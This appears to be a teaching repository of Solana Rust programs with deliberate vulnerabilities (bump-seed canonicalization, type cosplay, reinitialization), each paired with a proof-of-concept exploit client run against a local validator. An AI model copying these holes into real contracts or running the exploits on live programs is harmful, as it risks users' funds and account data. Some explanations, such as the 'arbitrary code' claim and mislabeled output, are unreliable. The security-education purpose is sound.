## bump-seed-canonicalization
```
bump-seed-canonicalization/Cargo.toml
bump-seed-canonicalization/README.MD
bump-seed-canonicalization/bump-seed-canonicalization/Cargo.toml
bump-seed-canonicalization/bump-seed-canonicalization/src/lib.rs
bump-seed-canonicalization/cicd.sh
bump-seed-canonicalization/poc/Cargo.toml
bump-seed-canonicalization/poc/src/main.rs
```
### bump-seed-canonicalization/bump-seed-canonicalization/src/lib.rs
```rust
/*
This Solana Rust raw program is a simple smart contract that 
    allows creating and modifying an account with a single u64 data field.
*/

/*
These are the required dependencies for the smart contract, 
including the Borsh serialization and deserialization library, 
the Solana program library, and the system variable library.
*/
use borsh::{BorshDeserialize, BorshSerialize};
use solana_program::{
    account_info::{next_account_info, AccountInfo},
    entrypoint,
    entrypoint::ProgramResult,
    program::invoke_signed,
    program_error::ProgramError,
    pubkey::Pubkey,
    rent::Rent,
    system_instruction::create_account,
    sysvar::Sysvar,
};

/*
This defines an enumeration called MyInstruction with two variants, 
Create and Modify, each with different fields. 
*/
#[derive(Debug, BorshDeserialize, BorshSerialize)]
pub enum MyInstruction {
    Create {amount: u64},
    Modify {amount: u64, new_amount: u64},
}

/*
This defines a struct called MyData with a single field amount of type u64. 
*/
#[derive(Debug, BorshSerialize, BorshDeserialize)]
pub struct MyData {
    pub amount: u64,
}

entrypoint!(process_instruction);

/*
This is the function that will be called when the program is invoked. 
It takes three arguments: program_id, which is the program's public key; 
    accounts, which is a slice of AccountInfo structs containing information 
    about the accounts involved in the instruction; and instruction_data, 
    which is a slice of bytes that contains the instruction data.
*/
fn process_instruction(
    program_id: &Pubkey,
    accounts: &[AccountInfo],
    mut instruction_data: &[u8],
) -> ProgramResult {
    /* 
    This deserializes the instruction data into a MyInstruction enum and then matches 
        the variant to either call create_acc or modify_acc function.
   */
    match MyInstruction::deserialize(&mut instruction_data)? {
        MyInstruction::Create { amount } => create_acc(&program_id, &accounts, amount),
        MyInstruction::Modify { amount, new_amount } => modify_acc(&program_id, &accounts, amount, new_amount),
    }
}
/* 
This is a function that creates a new account with the given amount and returns a ProgramResult.
*/
pub fn create_acc(
    program_id: &Pubkey,
    accounts: &[AccountInfo],
    amount: u64,
) -> ProgramResult {
/* 
This initializes the accounts_iter variable to an iterator over the accounts slice, 
    and then uses the next_account_info function to get the next three account infos from the iterator: 
    the payer, data_account, and system_program.
*/
    let accounts_iter = &mut accounts.iter();
    let payer = next_account_info(accounts_iter)?;
    let data_account = next_account_info(accounts_iter)?;
    let system_program = next_account_info(accounts_iter)?;

/* 
This creates a bump seed for the account address by converting the amount to little-endian bytes 
    and then uses the create_program_address function to generate the expected address of the new account.
*/
    let bump = amount.to_le_bytes();

    let expected_address = Pubkey::create_program_address(
        &[&bump.as_ref()], program_id)?;

/*
This checks if the actual address of the data_account matches the expected address, and if not, returns an InvalidArgument error.
*/
    if expected_address != *data_account.key {
        return Err(ProgramError::InvalidArgument);
    }

/* 
This creates the new account using the create_account system instruction, with the payer account paying for it. 
The invoke_signed function is used to sign the instruction with the payer account's signature, 
    and the data_account, payer, and system_program accounts are passed as arguments. 
The amount is also passed as a slice of bytes.
*/
    invoke_signed(
        &create_account(
            &payer.key,
            &expected_address,
            Rent::get()?.minimum_balance(std::mem::size_of::<MyData>()),
            std::mem::size_of::<MyData>()
                .try_into()
                .map_err(|_| ProgramError::InsufficientFunds)?,
            &program_id,
        ),
        &[payer.clone(), data_account.clone(), system_program.clone()],
        &[&[ amount.to_le_bytes().as_ref()]],
    )?;

/*
This serializes the new MyData struct and writes it to the data field of the new account. 
Finally, it returns an Ok result, indicating that the function executed successfully.
*/
    let new_data = MyData {
        amount: amount,
    };

    new_data.serialize(&mut data_account.try_borrow_mut_data()?.as_mut())?;

    Ok(())
}


/*
This is a function that modifies an existing account by changing the amount field to a new value new_amount.
*/
pub fn modify_acc(
    program_id: &Pubkey,
    accounts: &[AccountInfo],
    amount: u64,
    new_amount: u64,
) -> ProgramResult {
/*
This initializes the accounts_iter variable to an iterator over the accounts slice, 
    and then uses the next_account_info function to get the next account info from the iterator: the data_account.
*/
    let accounts_iter = &mut accounts.iter();
    let data_account = next_account_info(accounts_iter)?;

/*
This creates a bump seed for the account address by converting the amount to little-endian bytes and then uses 
    the create_program_address function to generate the expected address of the existing account.
*/
    let bump = amount.to_le_bytes();
    let expected_address = Pubkey::create_program_address(
        &[&bump.as_ref()], program_id)?;

/*
This checks if the actual address of the data_account matches the expected address, 
    and if not, returns an InvalidArgument error.
*/
    if expected_address != *data_account.key {
        return Err(ProgramError::InvalidArgument);
    }

/* 
This creates a new MyData struct with the amount field set to the new value new_amount, serializes it, 
    and writes it to the data field of the existing account. Finally, it returns an Ok result, 
    indicating that the function executed successfully.
*/
    let new_data = MyData {
        amount: new_amount,
    };

    new_data.serialize(&mut data_account.try_borrow_mut_data()?.as_mut())?;
    Ok(())
}
```
### bump-seed-canonicalization/poc/src/main.rs
```rust
use borsh::{BorshDeserialize, BorshSerialize};
use solana_client::{rpc_client::RpcClient};
use solana_program::{
    instruction::{AccountMeta, Instruction},
    pubkey::Pubkey,
    system_program,
};
use solana_sdk::{
    commitment_config::CommitmentConfig, 
    signature::{Keypair, Signer, read_keypair_file},
    transaction::Transaction,
    native_token::LAMPORTS_PER_SOL,

};

#[derive(Debug, BorshDeserialize, BorshSerialize)]
pub enum MyInstruction {
    Create {amount: u64},
    Modify {amount: u64, new_amount: u64},
}

#[derive(Debug, BorshSerialize, BorshDeserialize)]
pub struct MyData {
    pub amount: u64,
}

#[allow(dead_code)]
fn main() {

    // Get the program account's public key
    let programa_keypair = read_keypair_file("./target/so/bump_canon-keypair.json").unwrap();
    let programa = programa_keypair.pubkey();

    let cliente1 = String::from("http://localhost:8899");

    // Create a new keypair to use as the signer
    let authority = Keypair::new();

    // Create a new account to store the data
    // let data_account = Keypair::new();

    let env = RpcClient::new_with_commitment(cliente1, CommitmentConfig::confirmed());

    match env.request_airdrop(&authority.pubkey(), LAMPORTS_PER_SOL) {
        Ok(sig) => loop {
            if let Ok(confirmed) = env.confirm_transaction(&sig) {
                if confirmed {
                    println!("Transaction: {} Status: {}", sig, confirmed);
                    break;
                }
            }
        },
        Err(_) => println!("Error requesting airdrop"),
    };

    let amount: u64 = 10;

    let data_account = Pubkey::create_program_address(
        &[amount.to_le_bytes().as_ref()], &programa).unwrap();

    let tx_init = Instruction {
        program_id: programa,
        accounts: vec![
            AccountMeta::new(authority.pubkey(), true),
            AccountMeta::new(data_account, false),
            AccountMeta::new(system_program::id(), false),
        ],
        data: MyInstruction::Create {amount: amount}.try_to_vec().unwrap(),
    };
    let recent_blockhash = env.get_latest_blockhash().unwrap();

    let tx_init = Transaction::new_signed_with_payer(
        &[tx_init],
        Some(&authority.pubkey()),
        &[&authority],
        recent_blockhash,
    );
        
    // println!("TX {:#?}", tx_init);    
    if let Err(err) = env.send_and_confirm_transaction(&tx_init) {
        println!("{:#?}", err);
        panic!();
    };

    // Get the current value of the data
    let data_account_info = env.get_account_data(&data_account).unwrap();
    // let current_value = u64::from_le_bytes(data_account_info.as_slice().try_into().unwrap());

    // println!("Transaction signature: {}", result);
    println!("Created account address: {}", data_account);
    println!("Created account data info: {:?}", MyData::deserialize(&mut data_account_info.as_ref()).unwrap());
    // println!("Data account: {:?}", MyData::deserialize(data_account_info).unwrap());
    // println!("Current value: {}", current_value);

    let fake_account = Keypair::new();

    match env.request_airdrop(&fake_account.pubkey(), LAMPORTS_PER_SOL) {
        Ok(sig) => loop {
            if let Ok(confirmed) = env.confirm_transaction(&sig) {
                if confirmed {
                    println!("Transaction: {} Status: {}", sig, confirmed);
                    break;
                }
            }
        },
        Err(_) => println!("Error requesting airdrop"),
    };

    let new_amout:u64 = 1000;

    // let data_account = Pubkey::create_program_address(
    //     &[amount.to_le_bytes().as_ref()], &programa).unwrap();

    let tx_init = Instruction {
        program_id: programa,
        accounts: vec![
            AccountMeta::new(data_account, false),
        ],
        data: MyInstruction::Modify {amount: amount, new_amount: new_amout}.try_to_vec().unwrap(),
    };
    let recent_blockhash = env.get_latest_blockhash().unwrap();

    let tx_init = Transaction::new_signed_with_payer(
        &[tx_init],
        Some(&fake_account.pubkey()),
        &[&fake_account],
        recent_blockhash,
    );
        
    // println!("TX {:#?}", tx_init);    
    if let Err(err) = env.send_and_confirm_transaction(&tx_init) {
        println!("{:#?}", err);
        panic!();
    };

    let data_account_info = env.get_account_data(&data_account).unwrap();
    // let current_value = u64::from_le_bytes(data_account_info.as_slice().try_into().unwrap());

    // println!("Transaction signature: {}", result);
    println!("Modified account address: {}", data_account);
    println!("Created account data info: {:?}", MyData::deserialize(&mut data_account_info.as_ref()).unwrap());

}```
## cosplay
```
cosplay/Cargo.toml
cosplay/README.md
cosplay/cicd.sh
cosplay/cosplay/Cargo.toml
cosplay/cosplay/src/lib.rs
cosplay/poc/Cargo.toml
cosplay/poc/src/main.rs
```
### cosplay/README.md
```rust
# DISCLAMER
**It is important to note that this code is for demonstration purposes only and should not be used in a production environment.**

# Description
In this example, the program defines two enums: SafeEnum and VulnerableEnum. The SerializeSafe struct serializes a value of SafeEnum and stores it in a Solana account. The DeserializeVulnerable struct deserializes a value of VulnerableEnum from a different Solana account. This struct currently handles the One case correctly, but does not handle the Two and Three cases correctly, potentially allowing an attacker to exploit the vulnerability.
This vulnerability arises because the program never deserializes SafeEnum, so a user could create a value of VulnerableEnum that deserializes the same as SafeEnum and exploit the program's deserialization logic. To fix this vulnerability, the program should add additional checks to ensure that the deserialized value is of the expected type.

This PoC program demonstrates how an attacker could exploit the vulnerability in the DeserializeVulnerable struct within the vulnerable program.
The program first sets up a connection to a Solana cluster, creates a new keypair for the vulnerable program, and creates a program account with the minimum balance required for a program account. It then compiles and loads the program onto the cluster.
Next, the program creates two new accounts, account_a and account_b, and funds them with SOL from a sender account. It then retrieves the account info for both accounts.
Finally, the program calls the vulnerable program with account_a as the safe account and account_b as the vulnerable account. This triggers the deserialization of the data in account_b, which contains an instance of VulnerableEnum. If the data in account_b is set to VulnerableEnum::Two or VulnerableEnum::Three, the program will return an error and terminate. However, if the data is set to VulnerableEnum::One, the program will execute successfully.
In this way, an attacker could create an account with data that contains a vulnerable enum variant, and then call the vulnerable program with that account as the vulnerable account. This would allow the attacker to execute arbitrary code within the context of the vulnerable program and potentially gain control of the program and its associated accounts.

The program defines another enum and serializes, but never deserializes it, a user could create this enum, and, if it deserializes the same as the first enum, then this may be a possible vulnerability.

# More info
- https://www.soldev.app/course/type-cosplay
- https://github.com/coral-xyz/sealevel-attacks/tree/master/programs/3-type-cosplay```
### cosplay/cosplay/src/lib.rs
```rust
use borsh::{BorshDeserialize, BorshSerialize};
use solana_program::{
    account_info::{next_account_info, AccountInfo},
    entrypoint,
    entrypoint::ProgramResult,
    program_error::ProgramError,
    pubkey::Pubkey,
    msg
};

// Define two enums
#[allow(dead_code)]
#[derive(BorshSerialize)]
enum SafeEnum {
    One,
    Two,
}

#[derive(BorshSerialize, BorshDeserialize)]
enum VulnerableEnum {
    One,
    Two,
    Three,
}

// Define a struct that serializes SafeEnum
pub struct SerializeSafe<'a> {
    pub safe_account: &'a AccountInfo<'a>,
}

impl<'a> SerializeSafe<'a> {
    pub fn process(&self) -> ProgramResult {
        let data = SafeEnum::One.try_to_vec()?;
        self.safe_account.data.borrow_mut().copy_from_slice(&data);
        msg!("Serialized safe: {:?}", self.safe_account.data);
        Ok(())
    }
}

// Define a struct that deserializes VulnerableEnum
pub struct DeserializeVulnerable<'a> {
    pub vulnerable_account: &'a AccountInfo<'a>,
}

impl<'a> DeserializeVulnerable<'a> {
    pub fn process(&self) -> ProgramResult {
        let data = &self.vulnerable_account.data.borrow();
        let deserialized: VulnerableEnum = BorshDeserialize::try_from_slice(data)?;
        match deserialized {
            VulnerableEnum::One => {
                // This case is handled correctly
                msg!("Deserialized handled correctly: {:?}", self.vulnerable_account.data);
                Ok(())
            }
            VulnerableEnum::Two | VulnerableEnum::Three => {
                // These cases are not handled correctly and could be exploited by an attacker
                msg!("Deserialized not handled correctly: {:?}", self.vulnerable_account.data);
                Err(ProgramError::Custom(1))
            }
        }
    }
}

// The program entrypoint
entrypoint!(process_instruction);

pub fn process_instruction<'a>(
    _program_id: &Pubkey,
    accounts: &'a [AccountInfo<'a>],
    instruction_data: &[u8],
) -> ProgramResult {
    match instruction_data[0] {
        // Call SerializeSafe when the first byte of the instruction data is 0
        0 => {
            let accounts_iter = &mut accounts.iter();
            let safe_account = next_account_info(accounts_iter)?;
            let serialize_safe = SerializeSafe {
                safe_account,
            };
            serialize_safe.process()
        }
        // Call DeserializeVulnerable when the first byte of the instruction data is 1
        1 => {
            let accounts_iter = &mut accounts.iter();
            let vulnerable_account = next_account_info(accounts_iter)?;
            let deserialize_vulnerable = DeserializeVulnerable {
                vulnerable_account,
            };
            deserialize_vulnerable.process()
        }
        // Invalid instruction
        _ => Err(ProgramError::InvalidInstructionData),
    }
}```
### cosplay/poc/src/main.rs
```rust
use borsh::{BorshDeserialize, BorshSerialize};
use solana_client::{
    rpc_client::RpcClient,
};
use solana_program::{
    account_info::AccountInfo,
    instruction::{AccountMeta, Instruction},
    program_error::ProgramError,
};
use solana_sdk::{
    commitment_config::CommitmentConfig,
    signature::{Keypair, Signer, read_keypair_file},
    transaction::Transaction,
    native_token::LAMPORTS_PER_SOL,
    
};
use owo_colors::OwoColorize;

// Define two enums
#[derive(BorshSerialize)]
enum SafeEnum {
    One,
    // Two,
}

#[derive(BorshSerialize, BorshDeserialize, Debug)]
enum VulnerableEnum {
    One,
    Two,
    Three,
}

// Define a struct that serializes SafeEnum
pub struct SerializeSafe<'a> {
    pub safe_account: &'a AccountInfo<'a>,
}

impl<'a> SerializeSafe<'a> {
    pub fn process(&self) -> Result<(), ProgramError> {
        let data = SafeEnum::One.try_to_vec()?;
        self.safe_account.data.borrow_mut().copy_from_slice(&data);
        Ok(())
    }
}

// Define a struct that deserializes VulnerableEnum
#[derive(BorshSerialize, BorshDeserialize, Debug)]

pub struct DeserializeVulnerable<'a> {
    pub vulnerable_account: &'a AccountInfo<'a>,
}

impl<'a> DeserializeVulnerable<'a> {
    pub fn process(&self) -> Result<(), ProgramError> {
        let data = &self.vulnerable_account.data.borrow();
        let deserialized: VulnerableEnum = BorshDeserialize::try_from_slice(data)?;
        match deserialized {
            VulnerableEnum::One => {
                // This case is handled correctly
                Ok(())
            }
            VulnerableEnum::Two | VulnerableEnum::Three => {
                // These cases are not handled correctly and could be exploited by an attacker
                Err(ProgramError::Custom(1))
            }
        }
    }
}

fn main() {

    let programa_keypair = read_keypair_file("./target/so/cosplay-keypair.json").unwrap();
    let programa = programa_keypair.pubkey();

    let cliente1 = String::from("http://localhost:8899");

    //let payer = Keypair::new();
    let authority = Keypair::new();
    let safe_account = Keypair::new();
    let vulnerable_account = Keypair::new();

    let env = RpcClient::new_with_commitment(cliente1, CommitmentConfig::confirmed());

    match env.request_airdrop(&authority.pubkey(), LAMPORTS_PER_SOL) {
        Ok(sig) => loop {
            if let Ok(confirmed) = env.confirm_transaction(&sig) {
                if confirmed {
                    println!("Transaction: {} Status: {}", sig, confirmed);
                    break;
                }
            }
        },
        Err(_) => println!("Error requesting airdrop"),
    };

    let data_len = 1;
    let space:u64 = data_len as u64;
    
    let rent_exemption_amount = env.get_minimum_balance_for_rent_exemption(data_len).unwrap(); 

    let tx_create = solana_program::system_instruction::create_account( 
        &authority.pubkey(), 
        &safe_account.pubkey(), 
        rent_exemption_amount, 
        space, 
        &programa, 

    ); 

    let recent_blockhash = env.get_latest_blockhash().unwrap(); 
    let tx_create = Transaction::new_signed_with_payer( 
        &[tx_create], 
        Some(&authority.pubkey()), 
        &[&authority,&safe_account], 
        recent_blockhash, 
    ); 

    if let Err(err) = env.send_and_confirm_transaction(&tx_create) {
        println!("{:#?}", err);
        panic!();
    };

    let tx_create = solana_program::system_instruction::create_account( 
        &authority.pubkey(), 
        &vulnerable_account.pubkey(), 
        rent_exemption_amount, 
        space, 
        &programa, 

    ); 

    let recent_blockhash = env.get_latest_blockhash().unwrap(); 
    let tx_create = Transaction::new_signed_with_payer( 
        &[tx_create], 
        Some(&authority.pubkey()), 
        &[&authority,&vulnerable_account], 
        recent_blockhash, 
    ); 

    if let Err(err) = env.send_and_confirm_transaction(&tx_create) {
        println!("{:#?}", err);
        panic!();
    };

    println!("");
    println!("{}", "Working...".purple().bold());
    println!("");
    println!("Account 1: {}", safe_account.pubkey());
    println!("Account 2: {}", vulnerable_account.pubkey());

    let tx_init = Instruction {
        program_id: programa,
        accounts: vec![
            AccountMeta::new(safe_account.pubkey(), false),
        ],
        data: vec![0].into(),
    };
    let recent_blockhash = env.get_latest_blockhash().unwrap();

    let tx_init = Transaction::new_signed_with_payer(
        &[tx_init],
        Some(&authority.pubkey()),
        &[&authority],
        recent_blockhash,
    );
        
    if let Err(err) = env.send_and_confirm_transaction(&tx_init) {
        println!("{:#?}", err);
        panic!();
    };

    let ac1_d = env.get_account_data(&safe_account.pubkey()).unwrap();
    let ac2_d = env.get_account_data(&vulnerable_account.pubkey()).unwrap();

    println!("{}", "Duplicate Mutable Accounts, passing two different accounts".green());

    println!("Account 1 data: {:?}", ac1_d);
    println!("Account 2 data: {:?}", ac2_d);

    //Second call using same account
     let tx_init = Instruction {
        program_id: programa,
        accounts: vec![
            AccountMeta::new(vulnerable_account.pubkey(), false),
        ],
        data: vec![1].into(),
    };
    let recent_blockhash = env.get_latest_blockhash().unwrap();

    let tx_init = Transaction::new_signed_with_payer(
        &[tx_init],
        Some(&authority.pubkey()),
        &[&authority],
        recent_blockhash,
    );
        
    if let Err(err) = env.send_and_confirm_transaction(&tx_init) {
        println!("{:#?}", err);
        panic!();
    };

    let ac1_d = env.get_account_data(&safe_account.pubkey()).unwrap();
    let data1 = &ac1_d[..];
    let ac2_d = env.get_account_data(&vulnerable_account.pubkey()).unwrap();
    let data2 = &ac2_d[..];

    println!("SafeEnum::One.try_to_vec(): {:?}", SafeEnum::One.try_to_vec());
    println!("safe_account data: {:?}", VulnerableEnum::deserialize(&mut data1.as_ref()));
    println!("vulnerable_account data: {:?}", VulnerableEnum::deserialize(&mut data2.as_ref()));

    println!("");
    
    // Print the account information
    println!("Account safe_account: {:?}", env.get_account(&safe_account.pubkey()));
    println!("Account vulnerable_account: {:?}", env.get_account(&vulnerable_account.pubkey()));
}```
## reinitialization
```
reinitialization/Cargo.toml
reinitialization/README.md
reinitialization/cicd.sh
reinitialization/poc/Cargo.toml
reinitialization/poc/src/main.rs
reinitialization/reinit-attack/Cargo.toml
reinitialization/reinit-attack/src/lib.rs
```
### reinitialization/README.md
```rust
# DISCLAMER
**It is important to note that this code is for demonstration purposes only and should not be used in a production environment.**

# Description
This code is prone to a reinitialization attack because the initialize function does not validate that the account being initialized has not already been initialized. In other words, an attacker could call the initialize function multiple times on the same account, causing the account's data to be overwritten and potentially leading to unexpected behavior or vulnerabilities in the program.

## Prevention
To prevent this vulnerability, the initialize function should first validate that the account being initialized has not already been initialized. This can be done by checking whether the IsInitialized trait is already implemented for the account's data. If the account is already initialized, the function should return an error indicating that the account has already been initialized and should not be reinitialized.
By validating that an account is not already initialized before attempting to initialize it, the program can prevent reinitialization attacks and ensure that the account's data remains consistent and valid.

# More information
- https://github.com/coral-xyz/sealevel-attacks/tree/master/programs/4-initialization
- https://www.soldev.app/course/reinitialization-attacks```
### reinitialization/poc/src/main.rs
```rust

use borsh::{BorshDeserialize, BorshSerialize};
use arrayref::{array_ref};
use solana_client::rpc_client::RpcClient;
use solana_program::{
        pubkey::Pubkey,
        instruction::{AccountMeta, Instruction},
        program_error::ProgramError,
        program_pack::{IsInitialized, Pack, Sealed},
    };

use solana_sdk::{
        system_program,
        signature::{Keypair, read_keypair_file}, 
        signer::Signer, 
        commitment_config::CommitmentConfig,
        transaction::Transaction,
        native_token::LAMPORTS_PER_SOL,
    };
    
use owo_colors::OwoColorize;

#[derive(BorshSerialize, BorshDeserialize, Debug, PartialEq)]
enum MyInstruction {
  Init { },
  Create { }
}
#[derive(BorshSerialize, BorshDeserialize, PartialEq, Debug)]
pub struct User {
  authority: Pubkey,
}

impl Sealed for User {}

impl IsInitialized for User {
  fn is_initialized(&self) -> bool {
      true
  }
}

impl Pack for User {
  const LEN: usize = 32;

  fn pack_into_slice(&self, dst: &mut [u8]) {
      dst.copy_from_slice(self.authority.as_ref())
  }

  fn unpack_from_slice(src: &[u8]) -> Result<Self, ProgramError> {
      Ok(Self {
          authority: Pubkey::new_from_array(*array_ref![src, 0, 32]),
      })
  }
}

fn main() {

    let programa_keypair = read_keypair_file("./target/so/reinit_attack-keypair.json").unwrap();
    let programa = programa_keypair.pubkey();

    let cliente1 = String::from("http://localhost:8899");

    //let payer = Keypair::new();
    let authority = Keypair::new();
    let account1 = Keypair::new();
    let account2 = Keypair::new();
    let account3 = Keypair::new();

    let env = RpcClient::new_with_commitment(cliente1, CommitmentConfig::confirmed());

    match env.request_airdrop(&authority.pubkey(), LAMPORTS_PER_SOL) {
        Ok(sig) => loop {
            if let Ok(confirmed) = env.confirm_transaction(&sig) {
                if confirmed {
                    println!("Transaction: {} Status: {}", sig, confirmed);
                    break;
                }
            }
        },
        Err(_) => println!("Error requesting airdrop"),
    };

    let data_len = 32;
    // let data_len = Rent::get().unwrap().minimum_balance(std::mem::size_of::<User>());
    let space:u64 = data_len as u64;
    
    let rent_exemption_amount = env.get_minimum_balance_for_rent_exemption(data_len as usize).unwrap(); 

    let tx_create = solana_program::system_instruction::create_account( 
        &authority.pubkey(), 
        &account1.pubkey(), 
        rent_exemption_amount, 
        space, 
        &programa, 

    ); 

    let recent_blockhash = env.get_latest_blockhash().unwrap(); 
    let tx_create = Transaction::new_signed_with_payer( 
        &[tx_create], 
        Some(&authority.pubkey()), 
        &[&authority,&account1], 
        recent_blockhash, 
    ); 

    if let Err(err) = env.send_and_confirm_transaction(&tx_create) {
        println!("{:#?}", err);
        panic!();
    };

    let tx_create = solana_program::system_instruction::create_account( 
        &authority.pubkey(), 
        &account2.pubkey(), 
        rent_exemption_amount, 
        space, 
        &programa, 

    ); 

    let recent_blockhash = env.get_latest_blockhash().unwrap(); 
    let tx_create = Transaction::new_signed_with_payer( 
        &[tx_create], 
        Some(&authority.pubkey()), 
        &[&authority,&account2], 
        recent_blockhash, 
    ); 

    if let Err(err) = env.send_and_confirm_transaction(&tx_create) {
        println!("{:#?}", err);
        panic!();
    };

    println!("");
    println!("{}", "Working...".purple().bold());
    println!("");
    println!("Account 1: {}", account1.pubkey());
    println!("Account 2: {}", account2.pubkey());

    let tx_init = Instruction {
        program_id: programa,
        accounts: vec![
            AccountMeta::new(account1.pubkey(), false),
            AccountMeta::new(account2.pubkey(), false),
            AccountMeta::new(system_program::ID, false),
        ],
        data: MyInstruction::Init {  }.try_to_vec().unwrap(),
    };
    let recent_blockhash = env.get_latest_blockhash().unwrap();

    let tx_init = Transaction::new_signed_with_payer(
        &[tx_init],
        Some(&authority.pubkey()),
        &[&authority],
        recent_blockhash,
    );
        
    if let Err(err) = env.send_and_confirm_transaction(&tx_init) {
        println!("{:#?}", err);
        panic!();
    };

    let ac1_d = env.get_account_data(&account1.pubkey()).unwrap();
    
    println!("{}", "Reinitialization Attacks".green());

    let data1 = User::unpack_unchecked(&ac1_d[..32]).unwrap();
    println!("Account 1 authority 1st: {:?}", data1.authority);

    /*
    Second call using same account
     */

     let tx_init = Instruction {
        program_id: programa,
        accounts: vec![
            AccountMeta::new(account1.pubkey(), false),
            AccountMeta::new(account3.pubkey(), false),
        ],
        data: MyInstruction::Init {  }.try_to_vec().unwrap(),
    };
    let recent_blockhash = env.get_latest_blockhash().unwrap();

    let tx_init = Transaction::new_signed_with_payer(
        &[tx_init],
        Some(&authority.pubkey()),
        &[&authority],
        recent_blockhash,
    );
        
    if let Err(err) = env.send_and_confirm_transaction(&tx_init) {
        println!("{:#?}", err);
        panic!();
    };

    let ac1_d = env.get_account_data(&account1.pubkey()).unwrap();

    let data2 = User::unpack_unchecked(&ac1_d[..32]).unwrap();

    if data1 != data2 { 
        println!("{}", "The Account has being reinitialized and it has overridden existing account data".red());
    }

    println!("Account 1 authority 2nd: {:?}", data2.authority);
}```
### reinitialization/reinit-attack/src/lib.rs
```rust
use borsh::{BorshDeserialize, BorshSerialize};
use arrayref::{array_ref};

use solana_program::{
  account_info::{next_account_info, AccountInfo},
  entrypoint,
  entrypoint::ProgramResult,
  msg,
  program_error::ProgramError,
  program_pack::{IsInitialized, Pack, Sealed},
  pubkey::Pubkey,
};

#[derive(BorshSerialize, BorshDeserialize, Debug, PartialEq)]
enum MyInstruction {
  Init {},
}

#[derive(BorshSerialize, BorshDeserialize, PartialEq, Debug)]
pub struct User {
  authority: Pubkey,
}

impl Sealed for User {}

impl IsInitialized for User {
  fn is_initialized(&self) -> bool {
      true
  }
}

impl Pack for User {
  const LEN: usize = 32;

  fn pack_into_slice(&self, dst: &mut [u8]) {
      dst.copy_from_slice(self.authority.as_ref())
  }

  fn unpack_from_slice(src: &[u8]) -> Result<Self, ProgramError> {
      Ok(Self {
          authority: Pubkey::new_from_array(*array_ref![src, 0, 32]),
      })
  }
}

entrypoint!(process_instruction);

pub fn process_instruction(program_id: &Pubkey, accounts: &[AccountInfo], instruction_data: &[u8]) -> ProgramResult {
    match MyInstruction::try_from_slice(instruction_data)? {
      MyInstruction::Init{} => initialize(program_id, accounts, instruction_data),
  }
}

pub fn initialize(_program_id: &Pubkey, accounts: &[AccountInfo], _instruction_data: &[u8]) -> ProgramResult {
  let account_info_iter = &mut accounts.iter();

  let user_info = next_account_info(account_info_iter)?;
  let authority_info = next_account_info(account_info_iter)?;
  
  let mut user_data = user_info.try_borrow_mut_data()?;
  let mut user = User::unpack_unchecked(&user_data)?;
  msg!("User authority address is: {}", user.authority);

  user.authority = *authority_info.key;
  user.pack_into_slice(&mut user_data);

  msg!("User account initialized successfully.");
  msg!("User authority address is: {}", user.authority);
  Ok(())
}
```
## Histórico do 4-initialization/secure no sealevel
```
4bd537c cleaned up recommended, and fixed secure (#14)
d92ebdd Fix some builds issue
05a865c Split out cases into different crates
```
